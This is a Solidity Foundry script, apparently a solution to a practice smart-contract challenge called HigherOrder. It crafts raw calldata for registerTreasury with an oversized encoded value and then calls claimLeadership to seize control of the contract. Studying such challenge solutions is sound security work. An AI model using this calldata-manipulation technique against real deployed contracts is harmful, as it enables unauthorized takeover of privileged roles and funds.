// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import "../src/HigherOrder.sol";
import {Script} from "forge-std/Script.sol";

contract HigherOrderAttack is Script {
    HigherOrder public higherOrder = HigherOrder(0x57bfdE312ad259667334975A82f60781C957EfCf);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        (bool success,) = address(higherOrder).call(
            abi.encodePacked(
                higherOrder.registerTreasury.selector,
                abi.encode(0xFFF)
            )
        );

        require(success, "Failed");

        higherOrder.claimLeadership();

        vm.stopBroadcast();
    }
}